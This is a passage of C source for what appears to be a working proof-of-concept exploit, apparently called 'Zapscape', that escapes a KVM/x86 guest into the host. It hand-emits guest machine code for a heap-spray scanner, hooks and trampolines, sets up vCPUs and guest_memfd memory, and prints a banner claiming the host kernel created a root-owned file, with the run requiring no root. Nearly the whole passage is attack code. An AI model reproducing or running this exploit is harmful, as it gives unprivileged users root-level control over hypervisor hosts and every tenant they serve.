		if (list[i] == operand_gpa) {
			errno = EEXIST;
			die("duplicate relocation");
		}
	list[expected_c_relocs++] = operand_gpa;
}

static void collect_relocs(uint32_t first, uint32_t end)
{
	uint8_t *begin = M + first;
	uint8_t *limit = M + end;

	for (uint8_t *p = begin; p + 4 <= limit; p++) {
		uint32_t value;

		memcpy(&value, p, 4);
		int kind = operand_reloc_kind(value);

		if (!kind || !is_generated_abs_operand(begin, p))
			continue;
		if (kind == 2) {
			errno = EINVAL;
			die("natural-F fixed-page payload relocation");
		}
		append_c_reloc((uint32_t)(p - M));
	}
}

static bool c_reloc_table_has(uint32_t operand_gpa)
{
	uint32_t *list = (uint32_t *)(M + RELOC_C_LIST_GPA);

	for (uint32_t i = 0; i < expected_c_relocs; i++)
		if (list[i] == operand_gpa)
			return true;
	return false;
}

static void audit_target_literals(uint32_t first, uint32_t end)
{
	uint8_t *begin = M + first, *limit = M + end;

	for (uint8_t *p = begin; p + 4 <= limit; p++) {
		uint32_t value;

		memcpy(&value, p, 4);
		uint32_t kind = (uint32_t)operand_reloc_kind(value);

		if (!kind ||
		    (kind == 1 && c_reloc_table_has((uint32_t)(p - M))))
			continue;
		if (kind == 1 && value == TARGET_C_BASE && p > begin &&
		    p[-1] == 0x2d)
			continue;
		fprintf(stderr,
			"unclassified target literal value=%#x operand=%#x region=%#x..%#x\n",
			value, (unsigned int)(p - M), (unsigned int)(begin - M),
			(unsigned int)(limit - M));
		errno = EINVAL;
		die("unclassified target literal");
	}
}

static uint8_t *find_p1_hook(void)
{
	uint8_t pattern[10], *p = pattern;

	e8(&p, 0xa1);
	e32(&p, TARGET_P1_PTR);
	e8(&p, 0xa3);
	e32(&p, G1_MARKER + 32u);
	uint8_t *found = NULL;

	for (uint8_t *q = M + G1_CODE_B;
	     q + sizeof(pattern) <= M + G1_CODE_B + 0x1000u; q++) {
		if (!memcmp(q, pattern, sizeof(pattern))) {
			if (found) {
				errno = EEXIST;
				die("P1 hook ambiguity");
			}
			found = q;
		}
	}
	if (!found) {
		errno = ENOENT;
		die("P1 hook");
	}
	return found;
}

static uint8_t *find_fake_arm_wait(void)
{
	uint8_t pattern[14], *p = pattern;

	e8(&p, 0x80);
	e8(&p, 0x3c);
	e8(&p, 0x25);
	e32(&p, SPRAY_ARM + 10u);
	e8(&p, 'R');
	e8(&p, 0x74);
	e8(&p, 0x04);
	e8(&p, 0xf3);
	e8(&p, 0x90);
	e8(&p, 0xeb);
	uint8_t *found = NULL;

	for (uint8_t *q = M + G1_SPRAY_CODE;
	     q + sizeof(pattern) <= M + G1_SPRAY_CODE + 0x1000u; q++) {
		if (!memcmp(q, pattern, sizeof(pattern) - 1)) {
			if (found) {
				errno = EEXIST;
				die("fake-arm wait ambiguity");
			}
			found = q;
		}
	}
	if (!found) {
		errno = ENOENT;
		die("fake-arm wait");
	}
	return found;
}

static void emit_guest_scanner(uint8_t *p1_hook)
{
	uint8_t *p = M + G1_RELOC_CODE;
	uint8_t *scan_loop, *scan_next;
	uint8_t *below_direct_map[2], *past_direct_map[2];
	uint8_t *not_aligned, *bad_pointee_mod, *bad_pointee_slot;
	uint8_t *bad_c_mod, *bad_c_slot, *scan_more, *bad_count;
	uint8_t *c_done, *c_more;
	uint8_t *below_start, *past_end, *past_page, *bad_layout;
	uint8_t *multiple, *fail_ack, *back;

	e8(&p, 0xbe);
	e32(&p, SPRAY_START);
	e8(&p, 0x31);
	e8(&p, 0xed);
	e8(&p, 0x31);
	e8(&p, 0xff);
	scan_loop = p;
	e8(&p, 0x8b);
	e8(&p, 0x56);
	e8(&p, 0x04);
	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, KASLR_ARENA_HI_MIN);
	below_direct_map[0] = emit_rel32_jcc(&p, 0x82);
	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, KASLR_ARENA_HI_END);
	past_direct_map[0] = emit_rel32_jcc(&p, 0x83);
	e8(&p, 0x31);
	e8(&p, 0xc0);
	e8(&p, 0x31);
	e8(&p, 0xd2);
	e8(&p, 0x31);
	e8(&p, 0xdb);
	e8(&p, 0x31);
	e8(&p, 0xc9);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x0e);
	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, KASLR_ARENA_HI_MIN);
	below_direct_map[1] = emit_rel32_jcc(&p, 0x82);
	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, KASLR_ARENA_HI_END);
	past_direct_map[1] = emit_rel32_jcc(&p, 0x83);
	e8(&p, 0xa9);
	e32(&p, 7);
	not_aligned = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x25);
	e32(&p, 0xfffu);
	e8(&p, 0x31);
	e8(&p, 0xd2);
	e8(&p, 0xbb);
	e32(&p, MMU_HEADER_SIZE);
	e8(&p, 0xf7);
	e8(&p, 0xf3);
	e8(&p, 0x85);
	e8(&p, 0xd2);
	bad_pointee_mod = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x83);
	e8(&p, 0xf8);
	e8(&p, MMU_HEADERS_PER_SLAB - 1u);
	bad_pointee_slot = emit_rel32_jcc(&p, 0x87);
	e8(&p, 0x89);
	e8(&p, 0xf0);
	e8(&p, 0x83);
	e8(&p, 0xe8);
	e8(&p, 0x08);
	e8(&p, 0x25);
	e32(&p, 0xfffu);
	e8(&p, 0x31);
	e8(&p, 0xd2);
	e8(&p, 0xf7);
	e8(&p, 0xf3);
	e8(&p, 0x85);
	e8(&p, 0xd2);
	bad_c_mod = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x83);
	e8(&p, 0xf8);
	e8(&p, MMU_HEADERS_PER_SLAB - 1u);
	bad_c_slot = emit_rel32_jcc(&p, 0x87);
	e8(&p, 0x45);
	e8(&p, 0x89);
	e8(&p, 0xf7);
	scan_next = p;
	e8(&p, 0x83);
	e8(&p, 0xc6);
	e8(&p, 0x08);
	e8(&p, 0x81);
	e8(&p, 0xfe);
	e32(&p, SPRAY1_END);
	scan_more = emit_rel32_jcc(&p, 0x82);
	for (unsigned int i = 0; i < 2; i++) {
		patch_rel32(below_direct_map[i], scan_next);
		patch_rel32(past_direct_map[i], scan_next);
	}
	patch_rel32(not_aligned, scan_next);
	patch_rel32(bad_pointee_mod, scan_next);
	patch_rel32(bad_pointee_slot, scan_next);
	patch_rel32(bad_c_mod, scan_next);
	patch_rel32(bad_c_slot, scan_next);
	patch_rel32(scan_more, scan_loop);
	e8(&p, 0x89);
	e8(&p, 0x2d);
	e32(&p, DYN_SCAN_COUNT_SLOT);
	e8(&p, 0x83);
	e8(&p, 0xfd);
	e8(&p, 0x01);
	bad_count = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x89);
	e8(&p, 0xf8);
	e8(&p, 0x83);
	e8(&p, 0xe8);
	e8(&p, 0x08);
	emit32_store_eax(&p, DYN_C_GPA_SLOT);
	e8(&p, 0x89);
	e8(&p, 0xc2);
	e8(&p, 0x81);
	e8(&p, 0xe2);
	e32(&p, 0xfffff000u);
	emit_store_edx_abs(&p, DYN_PAGE_GPA_SLOT);
	e8(&p, 0x3d);
	e32(&p, SPRAY_START);
	below_start = emit_rel32_jcc(&p, 0x82);
	e8(&p, 0x89);
	e8(&p, 0xc1);
	e8(&p, 0x81);
	e8(&p, 0xc1);
	e32(&p, 168u);
	e8(&p, 0x81);
	e8(&p, 0xf9);
	e32(&p, SPRAY1_END);
	past_end = emit_rel32_jcc(&p, 0x87);
	e8(&p, 0x89);
	e8(&p, 0xc1);
	e8(&p, 0x81);
	e8(&p, 0xe1);
	e32(&p, 0xfffu);
	e8(&p, 0x81);
	e8(&p, 0xf9);
	e32(&p, 0xf58u);
	past_page = emit_rel32_jcc(&p, 0x87);
	e8(&p, 0x2d);
	e32(&p, TARGET_C_BASE);
	e8(&p, 0x8b);
	e8(&p, 0x0d);
	e32(&p, RELOC_C_COUNT_GPA);
	e8(&p, 0xbe);
	e32(&p, RELOC_C_LIST_GPA);
	e8(&p, 0x85);
	e8(&p, 0xc9);
	c_done = emit_rel32_jcc(&p, 0x84);
	c_more = p;
	e8(&p, 0x8b);
	e8(&p, 0x16);
	e8(&p, 0x01);
	e8(&p, 0x02);
	e8(&p, 0x83);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x49);
	{
		uint8_t *d = emit_rel32_jcc(&p, 0x85);

		patch_rel32(d, c_more);
	}
	patch_rel32(c_done, p);
	e8(&p, 0x8b);
	e8(&p, 0x15);
	e32(&p, RELOC_C_COUNT_GPA);
	emit_store_edx_abs(&p, DYN_C_APPLIED_SLOT);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	e8(&p, 0x31);
	e8(&p, 0xc0);
	e8(&p, 0x0f);
	e8(&p, 0xa2);
	emit32_store8_imm(&p, DYN_RELOC_STATUS, 'R');
	e8(&p, 0xa1);
	e32(&p, TARGET_P1_PTR);
	back = emit_rel32_jmp(&p);
	patch_rel32(back, p1_hook + 5);
	multiple = p;
	e8(&p, 0x85);
	e8(&p, 0xed);
	uint8_t *nonzero = emit_rel32_jcc(&p, 0x85);

	emit32_store8_imm(&p, DYN_RELOC_STATUS, '0');
	uint8_t *to_ack = emit_rel32_jmp(&p);
	uint8_t *multi_store = p;

	emit32_store8_imm(&p, DYN_RELOC_STATUS, 'M');
	uint8_t *multi_to_ack = emit_rel32_jmp(&p);

	bad_layout = p;
	emit32_store8_imm(&p, DYN_RELOC_STATUS, 'B');
	fail_ack = p;
	emit32_store8_imm(&p, SPRAY_ARM + 8u, 'Y');
	emit_fail_stop_loop(&p);
	patch_rel32(nonzero, multi_store);
	patch_rel32(to_ack, fail_ack);
	patch_rel32(multi_to_ack, fail_ack);
	patch_rel32(bad_count, multiple);
	patch_rel32(below_start, bad_layout);
	patch_rel32(past_end, bad_layout);
	patch_rel32(past_page, bad_layout);
	if (p > M + G1_RELOC_CODE + 0x1000u) {
		errno = EOVERFLOW;
		die("scanner code");
	}
}

static void emit_sprayer_wait_trampoline(uint8_t *wait_hook)
{
	uint8_t *p = M + G1_RELOC_WAIT_CODE;
	uint8_t *wait = p, *status_ready, *status_bad, *arm_ready, *again, *go;

	e8(&p, 0x80);
	e8(&p, 0x3c);
	e8(&p, 0x25);
	e32(&p, DYN_RELOC_STATUS);
	e8(&p, 0);
	status_ready = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0xf3);
	e8(&p, 0x90);
	again = emit_rel32_jmp(&p);
	patch_rel32(again, wait);
	patch_rel32(status_ready, p);
	e8(&p, 0x80);
	e8(&p, 0x3c);
	e8(&p, 0x25);
	e32(&p, DYN_RELOC_STATUS);
	e8(&p, 'R');
	status_bad = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x80);
	e8(&p, 0x3c);
	e8(&p, 0x25);
	e32(&p, SPRAY_ARM + 10u);
	e8(&p, 'R');
	arm_ready = emit_rel32_jcc(&p, 0x84);
	e8(&p, 0xf3);
	e8(&p, 0x90);
	again = emit_rel32_jmp(&p);
	patch_rel32(again, wait);
	patch_rel32(arm_ready, p);
	go = emit_rel32_jmp(&p);
	patch_rel32(go, wait_hook + 14);
	patch_rel32(status_bad, p);
	emit_fail_stop_loop(&p);
	wait_hook[0] = 0xe9;
	patch_rel32(wait_hook + 1, M + G1_RELOC_WAIT_CODE);
	memset(wait_hook + 5, 0x90, 9);
}

static void emit_post_sync_trampoline(void)
{
	uint8_t saved[10];
	uint8_t *entry = M + G1_POST_CODE;
	uint8_t *p = M + G1_RELOC_POST_CODE;
	uint8_t *wait = p, *ready, *bad, *again, *go;

	memcpy(saved, entry, sizeof(saved));
	e8(&p, 0x80);
	e8(&p, 0x3c);
	e8(&p, 0x25);
	e32(&p, DYN_RELOC_STATUS);
	e8(&p, 0);
	ready = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0xf3);
	e8(&p, 0x90);
	again = emit_rel32_jmp(&p);
	patch_rel32(again, wait);
	patch_rel32(ready, p);
	e8(&p, 0x80);
	e8(&p, 0x3c);
	e8(&p, 0x25);
	e32(&p, DYN_RELOC_STATUS);
	e8(&p, 'R');
	bad = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x31);
	e8(&p, 0xc0);
	e8(&p, 0x0f);
	e8(&p, 0xa2);
	memcpy(p, saved, sizeof(saved));
	p += sizeof(saved);
	go = emit_rel32_jmp(&p);
	patch_rel32(go, entry + sizeof(saved));
	patch_rel32(bad, p);
	emit_fail_stop_loop(&p);
	entry[0] = 0xe9;
	patch_rel32(entry + 1, M + G1_RELOC_POST_CODE);
	memset(entry + 5, 0x90, 5);
}

static void install_dynamic_guest_code(void)
{
	uint8_t *p1_hook = find_p1_hook();
	uint8_t *wait_hook = find_fake_arm_wait();
	uint32_t c0, q_c, post_c, helper_c;

	memset(M + G1_RELOC_TABLE, 0, 0x1000u);
	emit_guest_scanner(p1_hook);
	emit_sprayer_wait_trampoline(wait_hook);
	emit_post_sync_trampoline();
	emit_poc_guest_wake();
	emit_smp_guest_bootstraps();
	install_poc_q1_sentinel_handshake();
	install_poc_printk_activation();
	patch_poc_terminal_outs();
	c0 = expected_c_relocs;
	collect_relocs((uint32_t)(p1_hook - M) + 5u, G1_CODE_B + 0x1000u);
	q_c = expected_c_relocs - c0;
	c0 = expected_c_relocs;
	collect_relocs(G1_POST_CODE + 10u, G1_POST_CODE + 0x1000u);
	post_c = expected_c_relocs - c0;
	c0 = expected_c_relocs;
	collect_relocs(G1_HELPER_CODE, G1_HELPER_CODE + G1_HELPER_CODE_SIZE);
	helper_c = expected_c_relocs - c0;
	collect_relocs(G1_RELOC_CODE, G1_RELOC_CODE + 0x1000u);
	audit_target_literals((uint32_t)(p1_hook - M) + 5u,
			      G1_CODE_B + 0x1000u);
	audit_target_literals(G1_POST_CODE + 10u, G1_POST_CODE + 0x1000u);
	audit_target_literals(G1_HELPER_CODE,
			      G1_HELPER_CODE + G1_HELPER_CODE_SIZE);
	audit_target_literals(G1_RELOC_CODE, G1_RELOC_CODE + 0x1000u);
	if (expected_c_relocs != 441u) {
		errno = EINVAL;
		die("natural-F C relocation count");
	}
	*(uint32_t *)(M + RELOC_C_COUNT_GPA) = expected_c_relocs;
	p1_hook[0] = 0xe9;
	patch_rel32(p1_hook + 1, M + G1_RELOC_CODE);
	printf("[DYN-BUILD] P1 hook=%#x wait-hook=%#x C-relocs=%u fixed-page-payload-relocs=0(forbidden)\n",
	       (unsigned int)(p1_hook - M), (unsigned int)(wait_hook - M),
	       expected_c_relocs);
	printf("[DYN-BUILD] C-reloc distribution q=%u post=%u helper=%u scanner=%u\n",
	       q_c, post_c, helper_c,
	       expected_c_relocs - q_c - post_c - helper_c);
}

static bool poc_terminal_io(const struct kvm_run *run, size_t runsz,
			    uint16_t port)
{
	uint8_t token = port == POC_TERM_PORT_MAIN  ? POC_TERM_TOKEN_MAIN :
			port == POC_TERM_PORT_SPRAY ? POC_TERM_TOKEN_SPRAY :
			port == POC_PARK_PORT_MAIN  ? POC_PARK_TOKEN_MAIN :
			port == POC_PARK_PORT_SPRAY ? POC_PARK_TOKEN_SPRAY :
						      0;
	uint64_t off = run->io.data_offset;
	uint64_t bytes = (uint64_t)run->io.size * run->io.count;

	return token && run->exit_reason == KVM_EXIT_IO &&
	       run->io.direction == KVM_EXIT_IO_OUT && run->io.size == 1u &&
	       run->io.count == 1u && run->io.port == port && off <= runsz &&
	       bytes <= runsz - off && *((const uint8_t *)run + off) == token;
}

static size_t poc_vcpu_run_size;
static pthread_barrier_t smp_start_barrier;
static pthread_mutex_t smp_terminal_lock = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t smp_terminal_cond = PTHREAD_COND_INITIALIZER;
static unsigned int smp_terminal_mask;
static int smp_trigger_run_calls;
static int smp_trigger_eagain_reentries;
static int smp_spray_run_calls;
static void smp_barrier_wait(pthread_barrier_t *barrier, const char *what)
{
	int ret = pthread_barrier_wait(barrier);

	if (ret && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		errno = ret;
		die(what);
	}
}

static void smp_notify_terminal(unsigned int bit)
{
	int ret = pthread_mutex_lock(&smp_terminal_lock);

	if (ret) {
		errno = ret;
		die("terminal mutex lock");
	}
	if (!(smp_terminal_mask & bit)) {
		smp_terminal_mask |= bit;
		if (smp_terminal_mask == 3u) {
			ret = pthread_cond_signal(&smp_terminal_cond);
			if (ret) {
				errno = ret;
				die("terminal cond signal");
			}
		}
	}
	ret = pthread_mutex_unlock(&smp_terminal_lock);
	if (ret) {
		errno = ret;
		die("terminal mutex unlock");
	}
}

static unsigned int smp_wait_for_terminals(void)
{
	int ret = pthread_mutex_lock(&smp_terminal_lock);

	if (ret) {
		errno = ret;
		die("terminal mutex lock");
	}
	while (smp_terminal_mask != 3u) {
		ret = pthread_cond_wait(&smp_terminal_cond, &smp_terminal_lock);
		if (ret) {
			errno = ret;
			die("terminal cond wait");
		}
	}
	unsigned int completed = smp_terminal_mask;

	ret = pthread_mutex_unlock(&smp_terminal_lock);
	if (ret) {
		errno = ret;
		die("terminal mutex unlock");
	}
	return completed;
}

static void run_phase_poc(int vcpu, struct kvm_run *run, size_t runsz,
			  const char *name)
{
	int run_calls = 0;
	int eagain_reentries = 0;
	bool terminal_seen = false;

	for (;;) {
		if (ioctl(vcpu, KVM_RUN, 0) < 0) {
			if (errno == EINTR)
				continue;
			if (errno == EAGAIN) {
				eagain_reentries++;
				continue;
			}
			die("KVM_RUN");
		}
		run_calls++;
		struct vmcb *v = (struct vmcb *)(M + G1_VMCB);

		if (poc_terminal_io(run, runsz, POC_TERM_PORT_MAIN)) {
			smp_trigger_run_calls = run_calls;
			smp_trigger_eagain_reentries = eagain_reentries;
			terminal_seen = true;
			continue;
		}
		if (terminal_seen &&
		    poc_terminal_io(run, runsz, POC_PARK_PORT_MAIN)) {
			terminal_seen = false;
			smp_notify_terminal(1u);
			continue;
		}
		switch (run->exit_reason) {
		case KVM_EXIT_INTR:
			continue;
		case KVM_EXIT_HLT:
			continue;
		case KVM_EXIT_IO:
			printf("[TRIG] %s: unexpected IO exit port=%#x dir=%u size=%u count=%u; KVM_RUN calls=%d\n",
			       name, run->io.port, run->io.direction,
			       run->io.size, run->io.count, run_calls);
			return;
		case KVM_EXIT_INTERNAL_ERROR:
			printf("[TRIG] %s: INTERNAL_ERROR suberror=%u; KVM_RUN calls=%d\n",
			       name, run->internal.suberror, run_calls);
			return;
		case KVM_EXIT_SHUTDOWN:
			printf("[TRIG] %s: SHUTDOWN vmcb_exit=%#x; KVM_RUN calls=%d\n",
			       name, v->control.exit_code, run_calls);
			return;
		default:
			printf("[TRIG] %s: exit_reason=%u; KVM_RUN calls=%d\n",
			       name, run->exit_reason, run_calls);
			return;
		}
	}
}

struct smp_trigger_ctx {
	int vcpu;
	struct kvm_run *run;
	size_t runsz;
};

static void *run_smp_trigger(void *opaque)
{
	struct smp_trigger_ctx *c = opaque;

	pthread_setname_np(pthread_self(), "ztrigger");
	smp_barrier_wait(&smp_start_barrier, "AP start barrier");
	run_phase_poc(c->vcpu, c->run, c->runsz, "guest-only-dynamic");
	return NULL;
}

static void *run_sprayer(void *opaque)
{
	struct spray_ctx *c = opaque;
	int run_calls = 0;
	bool terminal_seen = false;

	pthread_setname_np(pthread_self(), "zclear");
	smp_barrier_wait(&smp_start_barrier, "BSP start barrier");
	for (;;) {
		if (ioctl(c->vcpu, KVM_RUN, 0) < 0) {
			if (errno == EINTR)
				continue;
			perror("sprayer KVM_RUN");
			break;
		}
		run_calls++;
		if (poc_terminal_io(c->run, poc_vcpu_run_size,
				    POC_TERM_PORT_SPRAY)) {
			smp_spray_run_calls = run_calls;
			terminal_seen = true;
			continue;
		}
		if (terminal_seen && poc_terminal_io(c->run, poc_vcpu_run_size,
						     POC_PARK_PORT_SPRAY)) {
			terminal_seen = false;
			smp_notify_terminal(2u);
			continue;
		}
		switch (c->run->exit_reason) {
		case KVM_EXIT_INTR:
			continue;
		case KVM_EXIT_HLT:
			continue;
		case KVM_EXIT_IO:
			printf("[CLEAR] unexpected IO port=%#x dir=%u size=%u count=%u; KVM_RUN calls=%d\n",
			       c->run->io.port, c->run->io.direction,
			       c->run->io.size, c->run->io.count, run_calls);
			goto done;
		case KVM_EXIT_INTERNAL_ERROR:
			printf("[CLEAR] INTERNAL_ERROR suberror=%u; KVM_RUN calls=%d\n",
			       c->run->internal.suberror, run_calls);
			goto done;
		case KVM_EXIT_SHUTDOWN:
			printf("[CLEAR] SHUTDOWN; KVM_RUN calls=%d\n",
			       run_calls);
			goto done;
		default:
			printf("[CLEAR] unexpected exit_reason=%u; KVM_RUN calls=%d\n",
			       c->run->exit_reason, run_calls);
			goto done;
		}
	}
done:
	return NULL;
}

struct dynamic_snapshot {
	uint32_t c_gpa;
	uint32_t page_gpa;
	uint32_t scan_count;
	uint32_t c_applied;
	uint8_t status;
};

static struct dynamic_snapshot dynamic_snapshot(void)
{
	struct dynamic_snapshot d = {
		.c_gpa = __atomic_load_n((uint32_t *)(M + DYN_C_GPA_SLOT),
					 __ATOMIC_ACQUIRE),
		.page_gpa = __atomic_load_n((uint32_t *)(M + DYN_PAGE_GPA_SLOT),
					    __ATOMIC_ACQUIRE),
		.scan_count =
			__atomic_load_n((uint32_t *)(M + DYN_SCAN_COUNT_SLOT),
					__ATOMIC_ACQUIRE),
		.c_applied = __atomic_load_n(
			(uint32_t *)(M + DYN_C_APPLIED_SLOT), __ATOMIC_ACQUIRE),
		.status =
			__atomic_load_n(M + DYN_RELOC_STATUS, __ATOMIC_ACQUIRE),
	};
	return d;
}

static bool dynamic_snapshot_valid(const struct dynamic_snapshot *d)
{
	return d->status == 'R' && d->scan_count == 1 &&
	       d->c_applied == expected_c_relocs && d->c_gpa >= SPRAY_START &&
	       d->c_gpa + 168u <= SPRAY1_END && !(d->c_gpa & 7u) &&
	       d->page_gpa == (d->c_gpa & 0xfffff000u) &&
	       (d->c_gpa & 0xfffu) <= 0xf58u;
}

static uint64_t dyn_read64(bool valid, uint32_t base, uint32_t off)
{
	if (!valid)
		return 0;
	return __atomic_load_n((uint64_t *)(M + base + off), __ATOMIC_ACQUIRE);
}

static uint32_t dyn_read32(bool valid, uint32_t base, uint32_t off)
{
	if (!valid)
		return 0;
	return __atomic_load_n((uint32_t *)(M + base + off), __ATOMIC_ACQUIRE);
}

enum { FRONTEND_PASS_TOKEN = 'P' };
static void notify_frontend_pass(int notify_fd)
{
	const unsigned char token = FRONTEND_PASS_TOKEN;
	ssize_t written;

	do {
		written = write(notify_fd, &token, sizeof(token));
	} while (written < 0 && errno == EINTR);
	if (written == (ssize_t)sizeof(token)) {
		(void)close(notify_fd);
		return;
	}
	fprintf(stderr,
		"[FRONTEND] final PASS notification failed: %s; preserving live VM\n",
		written < 0 ? strerror(errno) : "short pipe write");
	fflush(stderr);
}

static int wait_for_child_pass(int notify_fd, pid_t child)
{
	unsigned char token = 0;
	ssize_t got;

	do {
		got = read(notify_fd, &token, sizeof(token));
	} while (got < 0 && errno == EINTR);
	int saved_errno = errno;
	(void)close(notify_fd);
	if (got == (ssize_t)sizeof(token) && token == FRONTEND_PASS_TOKEN) {
		int reported = printf(
			"\n /$$$$$$$$  /$$$$$$  /$$$$$$$ \n"
			"|_____ $$  /$$__  $$| $$__  $$\n"
			"     /$$/ | $$  \\ $$| $$  \\ $$\n"
			"    /$$/  | $$$$$$$$| $$$$$$$/\n"
			"   /$$/   | $$__  $$| $$____/ \n"
			"  /$$/    | $$  | $$| $$      \n"
			" /$$$$$$$$| $$  | $$| $$      \n"
			"|________/|__/  |__/|__/      \n"
			"                            \n"
			"[+] /Zapscape created by the target KVM host kernel "
			"(owner uid=0, mode=0644).\n"
			"[+] exploit completed - verify with: ls -la /Zapscape\n");
		if (reported < 0 || fflush(stdout) || ferror(stdout)) {
			fprintf(stderr,
				"[-] final success message write failed\n");
			(void)fflush(stderr);
			return 1;
		}
		return 0;
	}
	if (got < 0) {
		errno = saved_errno;
		perror("frontend PASS pipe read");
		return 1;
	}
	if (got == (ssize_t)sizeof(token)) {
		fprintf(stderr,
			"[FRONTEND] invalid child notification byte %#x\n",
			token);
		return 1;
	}
	int status = 0;
	pid_t waited;

	do {
		waited = waitpid(child, &status, 0);
	} while (waited < 0 && errno == EINTR);
	if (waited == child && WIFEXITED(status))
		fprintf(stderr,
			"[FRONTEND] child exited before final PASS (status=%d)\n",
			WEXITSTATUS(status));
	else if (waited == child && WIFSIGNALED(status))
		fprintf(stderr,
			"[FRONTEND] child died before final PASS (signal=%d)\n",
			WTERMSIG(status));
	else if (waited < 0)
		perror("frontend waitpid");
	else
		fprintf(stderr, "[FRONTEND] child ended before final PASS\n");
	return 1;
}

static int run_poc_child(int notify_fd)
{
	pthread_setname_np(pthread_self(), "ztrig-dyn");
	uid_t vmm_uid = getuid(), vmm_euid = geteuid();
	gid_t vmm_gid = getgid(), vmm_egid = getegid();

	if (vmm_uid != 0 && vmm_euid != 0 && vmm_gid != 0 && vmm_egid != 0)
		printf("=== Zapscape guest-only KVM/x86 PoC uid/euid=%u/%u "
		       "gid/egid=%u/%u nonroot-required=%s ===\n",
		       (unsigned int)vmm_uid, (unsigned int)vmm_euid,
		       (unsigned int)vmm_gid, (unsigned int)vmm_egid, "YES");
	size_t MEMSZ = (size_t)MEMMB * 1024 * 1024;

	if (NPT_PT_POOL + (size_t)NPT_MAP_MAX * 0x1000u > MEMSZ ||
	    SPRAY_START >= MEMSZ || SPRAY_GUEST_END > MEMSZ) {
		errno = EINVAL;
		die("invalid QA/QB/memMB geometry");
	}
	unsigned long quota = ((unsigned long)(MEMSZ / 0x1000u) + 1ul) / 50ul;

	if (quota < 64)
		quota = 64;
	printf("[*] guestmemfd setup: QA=%d QB=%d memMB=%d "
	       "quota=automatic(%lu) geometry=compile-time-fixed "
	       "affinity=none backing=guestmemfd\n",
	       QA, QB, MEMMB, quota);
	int kvm = open("/dev/kvm", O_RDWR | O_CLOEXEC);

	if (kvm < 0)
		die("open kvm");
	int vm = ioctl(kvm, KVM_CREATE_VM, 0);

	if (vm < 0)
		die("CREATE_VM");
	X(vm, KVM_CREATE_IRQCHIP, NULL, "CREATE_IRQCHIP");
	struct kvm_create_guest_memfd gc = {
		.size = MEMSZ,
		.flags = GUEST_MEMFD_FLAG_MMAP | GUEST_MEMFD_FLAG_INIT_SHARED,
	};
	int gmem = ioctl(vm, KVM_CREATE_GUEST_MEMFD, &gc);

	if (gmem < 0)
		die("CREATE_GUEST_MEMFD");
	M = mmap(NULL, MEMSZ, PROT_READ | PROT_WRITE, MAP_SHARED, gmem, 0);
	if (M == MAP_FAILED)
		die("mmap");
	build();
	install_dynamic_guest_code();
	struct kvm_userspace_memory_region2 reg = {
		.slot = 0,
		.flags = KVM_MEM_GUEST_MEMFD,
		.guest_phys_addr = 0,
		.memory_size = MEMSZ,
		.userspace_addr = (uint64_t)M,
		.guest_memfd_offset = 0,
		.guest_memfd = (uint32_t)gmem,
	};
	X(vm, KVM_SET_USER_MEMORY_REGION2, &reg, "setmem2");
	uint8_t *reset_page = mmap(NULL, 0x1000u, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (reset_page == MAP_FAILED)
		die("mmap reset-vector page");
	reset_page[SMP_RESET_VECTOR_OFF + 0u] = 0xea;
	reset_page[SMP_RESET_VECTOR_OFF + 1u] = (uint8_t)SMP_BSP_BOOT16;
	reset_page[SMP_RESET_VECTOR_OFF + 2u] = (uint8_t)(SMP_BSP_BOOT16 >> 8);
	reset_page[SMP_RESET_VECTOR_OFF + 3u] = 0;
	reset_page[SMP_RESET_VECTOR_OFF + 4u] = 0;
	struct kvm_userspace_memory_region reset_reg = {
		.slot = 1,
		.flags = KVM_MEM_READONLY,
		.guest_phys_addr = SMP_RESET_PAGE_GPA,
		.memory_size = 0x1000u,
		.userspace_addr = (uint64_t)reset_page,
	};
	X(vm, KVM_SET_USER_MEMORY_REGION, &reset_reg, "set reset-vector page");
	int spray_vcpu = ioctl(vm, KVM_CREATE_VCPU, 0);

	if (spray_vcpu < 0)
		die("CREATE_VCPU BSP spray");
	setup_cpuid(kvm, spray_vcpu);
	int runsz = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, 0);

	if (runsz < 0)
		die("GET_VCPU_MMAP_SIZE");
	if ((size_t)runsz < sizeof(struct kvm_run)) {
		errno = EINVAL;
		die("short KVM vCPU mmap size");
	}
	struct kvm_run *spray_run = mmap(NULL, runsz, PROT_READ | PROT_WRITE,
					 MAP_SHARED, spray_vcpu, 0);
	int vcpu = ioctl(vm, KVM_CREATE_VCPU, 1);

	if (vcpu < 0)
		die("CREATE_VCPU AP trigger");
	setup_cpuid(kvm, vcpu);
	struct kvm_run *run =
		mmap(NULL, runsz, PROT_READ | PROT_WRITE, MAP_SHARED, vcpu, 0);
	if (spray_run == MAP_FAILED || run == MAP_FAILED)
		die("mmap vcpu run");
	struct spray_ctx sc = { .vcpu = spray_vcpu, .run = spray_run };

	poc_vcpu_run_size = runsz;
	int barrier_ret = pthread_barrier_init(&smp_start_barrier, NULL, 3);

	if (barrier_ret) {
		errno = barrier_ret;
		die("pthread_barrier_init start");
	}
	printf("[*] exploit running - waiting for the target KVM host kernel to "
	       "create /Zapscape as root; BSP vCPU0=sprayer, "
	       "AP vCPU1=UNINITIALIZED, wake=guest INIT/SIPI only\n");
	printf("[TRIG-DYN] --- post-launch vCPU loops=KVM_RUN/reentry; main=TERM/PARK-wait then result-observation ---\n");
	if (fflush(stdout))
		die("fflush before KVM_RUN");
	pthread_t spray_thread;
	struct smp_trigger_ctx tc = {
		.vcpu = vcpu,
		.run = run,
